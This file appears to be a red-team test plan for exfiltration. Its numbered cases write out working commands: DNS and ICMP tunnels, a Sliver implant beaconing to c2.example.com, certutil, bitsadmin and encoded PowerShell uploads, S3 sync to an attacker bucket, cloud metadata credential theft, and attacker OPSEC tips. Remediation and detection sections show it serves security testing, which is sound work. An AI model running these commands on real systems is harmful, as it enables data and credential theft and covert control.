# Data Exfiltration Attack — Test Cases

> Structured test case templates for validating exfiltration coverage. **Objective**: produce reproducible evidence of which exfil channels bypass DLP/SWG/CASB and at what volume.

## Conventions

- **Severity**: CRITICAL / HIGH / MEDIUM / LOW
- **Prerequisites**: Required access, egress position
- **Objective**: Per-case attack goal
- **Reference**: Pointer to `payloads.md` section

---

## A. Egress Reconnaissance

### TC-EX-001 — Outbound Port Enumeration

**Severity**: LOW
**Prerequisites**: Internal network access on victim host
**Objective**: Identify allowed outbound ports

**Test Steps**:
1. `for port in 53 80 443 123 8080 8443; do nc -vz exit-proxy $port; done`
2. Record which ports succeed
3. Test UDP: `nc -uvz exit-proxy 53`
4. Identify any allowlist proxies

**Expected Results**:
- Typical corp: 80/443 outbound + 53 DNS
- Restricted: only 443 + 53
- OT network: only OT protocols

**Remediation**:
- Restrict outbound to specific destinations
- Block direct Internet, force proxy

**Pass Criteria**: Port matrix documented
**Reference**: payloads.md §1.1

---

### TC-EX-002 — DNS Egress Validation

**Severity**: LOW
**Prerequisites**: Internal DNS access
**Objective**: Verify DNS recursion to attacker-controlled NS works

**Test Steps**:
1. `dig +short AAAA test.exfil.example.com @internal-dns`
2. Verify response from attacker NS
3. Test TXT query: `dig TXT $(openssl rand -hex 16).exfil.example.com`
4. Test long labels (63+ chars)

**Expected Results**:
- Recursion works: response from attacker NS
- TXT record works: bidirectional channel OK
- Long label works: 63+ char labels OK

**Remediation**:
- Restrict DNS recursion
- Block TXT/NULL queries externally
- Monitor query length

**Pass Criteria**: DNS channel viability documented
**Reference**: payloads.md §1.2

---

### TC-EX-003 — DLP/SWG Identification

**Severity**: LOW
**Prerequisites**: Egress access
**Objective**: Identify DLP/SWG vendor in path

**Test Steps**:
1. `curl -sI https://www.google.com | grep -iE "zscaler|netskope|forcepoint|paloalto"`
2. `echo | openssl s_client -connect google.com:443 2>&1 | grep issuer`
3. Check for client cert request (mTLS CASB)

**Expected Results**:
- DLP vendor identified
- Cert chain shows interception CA
- Client cert request indicates mTLS

**Remediation**:
- N/A (recon only)

**Pass Criteria**: Vendor documented
**Reference**: payloads.md §1.3

---

## B. DNS Tunneling

### TC-EX-004 — iodine DNS Tunnel

**Severity**: HIGH
**Prerequisites**: Attacker-controlled NS, victim with DNS egress
**Objective**: Establish IP-over-DNS tunnel

**Test Steps**:
1. Server: `iodined -c -P REPLACE_WITH_YOUR_PW 172.16.0.1 t1.exfil.example.com`
2. Client: `iodine -P REPLACE_WITH_YOUR_PW t1.exfil.example.com`
3. Verify TUN: `ip addr show dns0`
4. SSH over tunnel: `ssh user@172.16.0.1`
5. SCP test file: `scp test.bin user@172.16.0.1:/tmp/`

**Expected Results**:
- Tunnel established: TUN device up
- SSH works: interactive shell
- SCP works: file transfer
- DLP/SWG: no alerts (DNS not inspected)

**Remediation**:
- DNS firewall with tunnel detection
- Block TXT/NULL queries
- Rate-limit per src DNS

**Pass Criteria**: Tunnel established + file transferred
**Reference**: payloads.md §2.1

---

### TC-EX-005 — dnscat2 C2 Channel

**Severity**: HIGH
**Prerequisites**: Attacker NS, victim DNS egress
**Objective**: Establish dnscat2 C2 session

**Test Steps**:
1. Server: `ruby dnscat2.rb exfil.example.com`
2. Client: `./dnscat2 exfil.example.com`
3. Issue commands via session
4. Test exfil via base64-encoded responses

**Expected Results**:
- Session established
- Commands execute
- Exfil works via DNS responses

**Remediation**:
- Monitor for dnscat2 protocol patterns
- Block long DNS responses

**Pass Criteria**: C2 session documented
**Reference**: payloads.md §2.2

---

### TC-EX-006 — Subdomain Exfil (Raw)

**Severity**: MEDIUM
**Prerequisites**: DNS egress
**Objective**: Exfil via base64 subdomain labels

**Test Steps**:
1. Split file: `split -b 50 secret.enc chunk_`
2. Encode: `base64 -w0 chunk_aa`
3. Send: `dig +short $data.t1.exfil.example.com`
4. Verify on server NS log

**Expected Results**:
- Data reaches NS logs
- DLP/SWG: most miss this
- Volume: ~100 bytes per query (small)

**Remediation**:
- Block DNS query length > 50 chars
- Monitor query volume per src

**Pass Criteria**: Data reconstruction on server verified
**Reference**: payloads.md §2.4

---

## C. HTTPS C2/Exfil

### TC-EX-007 — Sliver HTTPS Beacon

**Severity**: HIGH
**Prerequisites**: Attacker HTTPS server
**Objective**: Beacon out via HTTPS

**Test Steps**:
1. Generate implant: `sliver > generate --http https://c2.example.com`
2. Execute on victim
3. Verify beacon on server: `sliver > implants`
4. Issue commands, exfil via POST

**Expected Results**:
- Beacon every N seconds
- Commands execute
- DLP/SWG: no alert (HTTPS)

**Remediation**:
- TLS inspection on suspicious SNI
- Monitor for new TLS certs

**Pass Criteria**: Implant beacons + exfil succeeds
**Reference**: payloads.md §4.1

---

### TC-EX-008 — Chisel Reverse Tunnel (mTLS)

**Severity**: HIGH
**Prerequisites**: mTLS server cert
**Objective**: Establish reverse SOCKS proxy

**Test Steps**:
1. Server: `chisel server -p 8080 --reverse --tls-key k --tls-cert c`
2. Client: `chisel client https://c2.example.com:8080 R:1080:socks`
3. Verify: `proxychains nmap -sT 10.0.0.0/24`
4. Pivot through internal network

**Expected Results**:
- Reverse tunnel established
- SOCKS works for internal pivoting
- DLP/SWG: blends with WebSocket traffic

**Remediation**:
- Monitor long-lived HTTPS sessions
- Detect WebSocket tunneling

**Pass Criteria**: SOCKS proxy + internal scan via tunnel
**Reference**: payloads.md §4.2

---

### TC-EX-009 — Domain Fronting

**Severity**: CRITICAL
**Prerequisites**: CDN front (Cloudflare/AWS CloudFront)
**Objective**: Exfil disguised as CDN-fronted legit traffic

**Test Steps**:
1. Set up C2 behind Cloudflare: `c2.example.com`
2. From victim: `curl -H "Host: c2.example.com" https://legit-cdn-customer.com/`
3. Verify C2 receives request
4. Check DLP/SWG: logs show legit-cdn-customer.com

**Expected Results**:
- C2 receives request via CDN front
- DLP/SWG: logs only show CDN customer domain
- Effective for stealth exfil

**Remediation**:
- Inspect SNI vs Host header
- Block known CDN-fronting infrastructure

**Pass Criteria**: Domain fronting succeeds + evades detection
**Reference**: payloads.md §4.5

---

### TC-EX-010 — Dead-Drop Resolver via GitHub Gist

**Severity**: MEDIUM
**Prerequisites**: GitHub PAT (anonymous works for read)
**Objective**: Use GitHub gist as C2 channel

**Test Steps**:
1. Create gist with command
2. Victim: `curl https://api.github.com/gists/$ID | jq -r '.files."cmd".content'`
3. Execute command, exfil response as comment

**Expected Results**:
- C2 commands work via gist
- DLP/SWG: GitHub usually allowed
- Low visibility

**Remediation**:
- Monitor for anonymous gist API calls
- Block gist API if not needed

**Pass Criteria**: C2 via gist works
**Reference**: payloads.md §4.6

---

## D. ICMP Tunneling

### TC-EX-011 — Hans ICMP Tunnel

**Severity**: HIGH
**Prerequisites**: ICMP egress allowed
**Objective**: Establish ICMP tunnel

**Test Steps**:
1. Server: `hans -v -f -s 1 -P REPLACE_WITH_YOUR_PW 10.0.0.1`
2. Client: `hans -v -f -c -P REPLACE_WITH_YOUR_PW 10.0.0.1`
3. Verify TUN: `ip addr show tun0`
4. SSH over ICMP: `ssh user@10.0.0.1`

**Expected Results**:
- Tunnel established
- SSH works over ICMP
- DLP/SWG: ICMP usually uninspected

**Remediation**:
- Block ICMP echo at perimeter
- Monitor ICMP payload size

**Pass Criteria**: Tunnel + SSH works
**Reference**: payloads.md §3.1

---

### TC-EX-012 — Ptunnel TCP-over-ICMP

**Severity**: HIGH
**Prerequisites**: ICMP egress, internal SSH target
**Objective**: Forward TCP via ICMP

**Test Steps**:
1. Server: `ptunnel`
2. Client: `ptunnel -r exfil.example.com -lp 8000 -da internal-ssh -dp 22`
3. Connect: `ssh -p 8000 user@127.0.0.1`
4. Verify session

**Expected Results**:
- TCP forwarded via ICMP
- SSH session works
- DLP/SWG: no detection

**Remediation**:
- Same as TC-EX-011

**Pass Criteria**: TCP-over-ICMP verified
**Reference**: payloads.md §3.2

---

## E. Steganographic Exfil

### TC-EX-013 — PNG LSB Exfil

**Severity**: HIGH
**Prerequisites**: Image upload channel allowed
**Objective**: Embed data in PNG LSB

**Test Steps**:
1. Generate cover: `ffmpeg -f lavfi -i color=black:s=1920x1080:d=1 cover.png`
2. Embed: `steghide embed -cf cover.png -ef secret.enc -p REPLACE_WITH_YOUR_PW -sf stego.png`
3. Upload stego.png to image share
4. Verify extract on server

**Expected Results**:
- Stego file similar size to cover
- Extract on server works
- DLP/SWG: no detection (image allowed)

**Remediation**:
- Stego detection (entropy analysis)
- Image size limits
- Metadata scanning

**Pass Criteria**: Embed + extract verified
**Reference**: payloads.md §5.1

---

### TC-EX-014 — PDF Metadata Exfil

**Severity**: MEDIUM
**Prerequisites**: PDF upload channel
**Objective**: Hide payload in PDF metadata

**Test Steps**:
1. `exiftool -Comment="$(base64 secret.enc)" cover.pdf -o stego.pdf`
2. Upload stego.pdf
3. Extract on server: `exiftool stego.pdf | grep Comment | base64 -d`

**Expected Results**:
- Metadata embedded
- Extract works
- DLP/SWG: usually misses metadata

**Remediation**:
- Metadata scanning
- Strip metadata on upload

**Pass Criteria**: Metadata exfil works
**Reference**: payloads.md §5.4

---

### TC-EX-015 — Audio Steganography

**Severity**: MEDIUM
**Prerequisites**: Audio file upload channel
**Objective**: Embed payload in WAV

**Test Steps**:
1. Generate cover audio
2. `steghide embed -cf cover.wav -ef secret.enc -p REPLACE_WITH_YOUR_PW -sf stego.wav`
3. Upload stego.wav
4. Verify extract

**Expected Results**:
- Embed works
- Extract works
- DLP/SWG: usually misses audio steg

**Remediation**:
- Audio file entropy analysis
- File size limits

**Pass Criteria**: Audio steg verified
**Reference**: payloads.md §5.3

---

## F. Cloud Service Abuse

### TC-EX-016 — Google Drive Exfil

**Severity**: HIGH
**Prerequisites**: Victim Google Workspace creds
**Objective**: Exfil via rclone to attacker Drive

**Test Steps**:
1. Configure rclone: `rclone config`
2. Copy: `rclone copy /secret gdrive:exfil/`
3. Verify on attacker Drive

**Expected Results**:
- Upload succeeds
- Volume: GB-scale
- DLP/SWG: Google Workspace usually allowed

**Remediation**:
- Workspace audit logs
- External sharing monitoring

**Pass Criteria**: Drive exfil works
**Reference**: payloads.md §6.1

---

### TC-EX-017 — S3 Cross-Account Exfil

**Severity**: CRITICAL
**Prerequisites**: AWS creds, S3 egress
**Objective**: Exfil to attacker S3 bucket

**Test Steps**:
1. Configure AWS CLI with victim creds
2. `aws s3 sync /secret s3://attacker-bucket/`
3. Verify on attacker S3

**Expected Results**:
- Upload succeeds
- Volume: TB-scale possible
- DLP/SWG: if egress is S3 endpoint, no detection

**Remediation**:
- S3 bucket policy denies external
- CloudTrail monitoring for unusual upload

**Pass Criteria**: S3 exfil verified
**Reference**: payloads.md §6.2

---

### TC-EX-018 — GitHub Gist Exfil

**Severity**: MEDIUM
**Prerequisites**: GitHub PAT or anonymous gist
**Objective**: Exfil via gist content

**Test Steps**:
1. Encode: `base64 secret.enc > data.b64`
2. Create gist via API
3. Verify gist content matches

**Expected Results**:
- Gist created
- Content downloadable anonymously
- DLP/SWG: GitHub usually allowed

**Remediation**:
- Block gist API for non-developer hosts
- Monitor anonymous gist access

**Pass Criteria**: Gist exfil works
**Reference**: payloads.md §6.3

---

### TC-EX-019 — Slack/Discord Webhook Exfil

**Severity**: MEDIUM
**Prerequisites**: Webhook URL
**Objective**: Exfil via webhook POSTs

**Test Steps**:
1. `curl -X POST https://hooks.slack.com/... --data "{\"text\":\"$(base64 chunk)\"}"`
2. Loop over chunks
3. Verify messages on attacker Slack

**Expected Results**:
- Messages posted
- DLP/SWG: Slack/Discord usually allowed

**Remediation**:
- Webhook URL monitoring
- Block external webhooks

**Pass Criteria**: Webhook exfil works
**Reference**: payloads.md §6.5

---

## G. DLP Bypass

### TC-EX-020 — Triple-Encode Bypass

**Severity**: HIGH
**Prerequisites**: DLP in path
**Objective**: Bypass content inspection via encode chain

**Test Steps**:
1. Encrypt: `openssl enc -aes-256-cbc -k "$KEY" -in secret.enc -out stage1.bin`
2. Compress: `gzip stage1.bin`
3. Encode: `base64 -w0 stage1.bin.gz > stage2.b64`
4. Exfil stage2.b64

**Expected Results**:
- DLP can't read encrypted content
- Exfil succeeds
- Volume: ~33% larger (base64)

**Remediation**:
- Block unknown encrypted blobs
- Behavior-based detection (volume baseline)

**Pass Criteria**: Exfil succeeds undetected
**Reference**: payloads.md §8.1

---

### TC-EX-021 — Slow-and-Low Chunking

**Severity**: HIGH
**Prerequisites**: HTTPS egress
**Objective**: Evade volume-based detection

**Test Steps**:
1. Split: `split -b 256 secret.enc chunk_`
2. Loop with random delay: `curl https://c2.example.com -d @chunk_X; sleep 60+random`
3. Reconstruct on server

**Expected Results**:
- Volume per hour: low (KB-scale)
- Total time: hours/days
- DLP/SWG: no rate-based alert

**Remediation**:
- Behavior-based peer-group anomaly
- Cumulative volume tracking

**Pass Criteria**: Slow exfil evades detection
**Reference**: payloads.md §8.2

---

### TC-EX-022 — Format-Shift to Image

**Severity**: MEDIUM
**Prerequisites**: Image upload allowed
**Objective**: Convert data to image (DLP doesn't OCR)

**Test Steps**:
1. Convert bytes to grayscale pixels
2. Save as PNG
3. Upload as image
4. Verify reconstruction

**Expected Results**:
- Image upload succeeds
- DLP doesn't OCR
- Reconstruct via reverse transform

**Remediation**:
- OCR all images (expensive)
- Entropy analysis on uploads

**Pass Criteria**: Format-shift verified
**Reference**: payloads.md §8.3

---

## H. LOLBin Exfil

### TC-EX-023 — certutil Decode-and-Upload

**Severity**: HIGH
**Prerequisites**: Windows victim
**Objective**: Use certutil as LOLBin

**Test Steps**:
1. Encode: `certutil -encode secret.enc encoded.txt`
2. Upload via certutil: `certutil -urlcache -split -f https://c2.example.com/upload encoded.txt`

**Expected Results**:
- certutil succeeds
- DLP/SWG: Microsoft-signed binary, usually allowlisted

**Remediation**:
- Monitor certutil network access
- Block `-urlcache` flag

**Pass Criteria**: certutil exfil works
**Reference**: payloads.md §9.1

---

### TC-EX-024 — bitsadmin Low-and-Slow

**Severity**: MEDIUM
**Prerequisites**: Windows victim
**Objective**: Use BITS for throttled exfil

**Test Steps**:
1. `bitsadmin /create exfil`
2. `bitsadmin /addfile exfil https://c2.example.com/upload secret.enc`
3. `bitsadmin /resume exfil`
4. Monitor progress

**Expected Results**:
- BITS throttles naturally
- DLP/SWG: BITS looks like Windows Update

**Remediation**:
- Monitor BITS for non-MS targets
- Block BITS to external

**Pass Criteria**: BITS exfil works
**Reference**: payloads.md §9.2

---

### TC-EX-025 — PowerShell Encoded Command

**Severity**: HIGH
**Prerequisites**: Windows victim, PowerShell allowed
**Objective**: Bypass regex DLP via encoded command

**Test Steps**:
1. Build cmd: `$cmd = "iwr https://c2.example.com/ -Method POST -Body (gc secret.enc -Raw)"`
2. Encode: `$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))`
3. Execute: `powershell -EncodedCommand $enc`

**Expected Results**:
- Command executes
- DLP/SWG: encoded blobs often missed

**Remediation**:
- Decode + inspect EncodedCommand
- Script-block logging

**Pass Criteria**: Encoded PS exfil works
**Reference**: payloads.md §9.4

---

## I. Cloud-Native Exfil

### TC-EX-026 — AWS IMDS Cred Theft + S3 Exfil

**Severity**: CRITICAL
**Prerequisites**: EC2 instance access
**Objective**: Steal IMDS creds, exfil to attacker S3

**Test Steps**:
1. Get token: `TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token ...)`
2. Get creds: `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/role`
3. Configure AWS CLI with stolen creds
4. `aws s3 sync /secret s3://attacker-bucket/`

**Expected Results**:
- IMDS creds work
- S3 upload to attacker bucket
- Volume: TB-scale

**Remediation**:
- IMDSv2 with hop-count limit
- S3 bucket policy
- CloudTrail monitoring

**Pass Criteria**: IMDS + S3 exfil verified
**Reference**: payloads.md §14

---

### TC-EX-027 — Azure Managed Identity Exfil

**Severity**: CRITICAL
**Prerequisites**: Azure VM access
**Objective**: Use managed identity token to exfil

**Test Steps**:
1. Get token: `curl http://169.254.169.254/metadata/identity/oauth2/token?resource=https://storage.azure.com/`
2. Upload to attacker storage: `curl -X PUT https://attacker.blob.core.windows.net/exfil/data -H "Authorization: Bearer $TOKEN"`

**Expected Results**:
- Token works for storage.azure.com
- Upload to attacker storage
- Volume: TB-scale

**Remediation**:
- Restrict managed identity scope
- Storage account firewall

**Pass Criteria**: Azure MI exfil works
**Reference**: payloads.md §14

---

## J. Detection Validation

### TC-EX-028 — Sigma Rule for DNS Tunneling

**Severity**: MEDIUM
**Prerequisites**: SIEM with DNS logs
**Objective**: Validate DNS tunneling detection rule

**Test Steps**:
1. Deploy Sigma rule (long DNS query detection)
2. Run iodine tunnel (TC-EX-004)
3. Verify SIEM alert fires
4. Test false positive rate

**Expected Results**:
- Alert on long DNS queries
- FP rate: <5%

**Remediation**:
- Deploy detection in production

**Pass Criteria**: Detection rule validated
**Reference**: payloads.md §10.1

---

### TC-EX-029 — Domain Fronting Detection

**Severity**: MEDIUM
**Prerequisites**: Proxy logs
**Objective**: Validate SNI vs Host mismatch detection

**Test Steps**:
1. Deploy Sigma rule for SNI/Host mismatch
2. Run domain fronting (TC-EX-009)
3. Verify alert fires
4. Test FP rate

**Expected Results**:
- Alert on SNI/Host mismatch
- FP rate: <1%

**Remediation**:
- Deploy detection

**Pass Criteria**: Domain fronting detection works
**Reference**: payloads.md §17.1

---

### TC-EX-030 — Volume Anomaly Detection

**Severity**: MEDIUM
**Prerequisites**: SIEM with network logs
**Objective**: Validate volume-based detection

**Test Steps**:
1. Set Splunk SPL for >100MB/day egress
2. Run mass exfil (TC-EX-007 + 016)
3. Verify alert fires
4. Tune threshold

**Expected Results**:
- Alert on volume > 100MB
- FP rate: <2%

**Remediation**:
- Deploy with peer-group baseline

**Pass Criteria**: Volume detection works
**Reference**: payloads.md §17.2

---

## K. Air-Gapped Exfil

### TC-EX-031 — Ultrasonic Audio Exfil

**Severity**: CRITICAL (in air-gapped env)
**Prerequisites**: Air-gapped machine with speaker + nearby receiver
**Objective**: Exfil via ultrasonic audio

**Test Steps**:
1. Generate ultrasonic audio (18-20kHz)
2. Play on air-gapped machine
3. Record on nearby smartphone
4. Decode signal

**Expected Results**:
- Audio inaudible to humans
- Signal decodable at 1-2m range
- Speed: ~100 bits/sec

**Remediation**:
- Audio diode jamming
- Restrict audio devices

**Pass Criteria**: Ultrasonic exfil works
**Reference**: payloads.md §16.1

---

### TC-EX-032 — Power-Line Exfil (PowerHammer)

**Severity**: CRITICAL (in air-gapped env)
**Prerequisites**: Air-gapped machine, power-line tap
**Objective**: Exfil via power-line modulation

**Test Steps**:
1. Modulate CPU load to inject current draw signal
2. Tap power line at socket
3. Decode signal

**Expected Results**:
- Signal on power line
- Decodable at 10-50 bits/sec

**Remediation**:
- Power-line filters
- Restrict CPU access

**Pass Criteria**: Power-line exfil works
**Reference**: payloads.md §16.4

---

## L. OPSEC Validation

### TC-EX-033 — Infrastructure OPSEC Check

**Severity**: LOW
**Prerequisites**: Attacker infra
**Objective**: Verify OPSEC hygiene

**Test Steps**:
1. Domain age > 6 months
2. SSL cert valid (Let's Encrypt)
3. Realistic User-Agent rotation
4. Time-of-day traffic shaping

**Expected Results**:
- All OPSEC checks pass
- Reduced detection probability

**Remediation**:
- N/A (attacker-side)

**Pass Criteria**: OPSEC checklist complete
**Reference**: payloads.md §19

---

## M. Cross-Channel Variant

### TC-EX-034 — Multi-Channel Rotation

**Severity**: HIGH
**Prerequisites**: Multiple channels established
**Objective**: Rotate channels to evade per-channel detection

**Test Steps**:
1. Establish DNS, HTTPS, stego channels
2. Loop: random.choice(channels)(chunk)
3. Distribute exfil across 3+ channels
4. Verify reconstruction

**Expected Results**:
- Per-channel volume reduced
- Cumulative exfil complete
- Harder to attribute

**Remediation**:
- Cross-channel attribution
- Entity behavior analytics

**Pass Criteria**: Multi-channel exfil verified
**Reference**: payloads.md §10.2

---

## References

- payloads.md — full payload list
- guides/data-exfiltration-attack-playbook.md — operator playbook
- guides/real-world-incident-case-studies.md — historical incidents
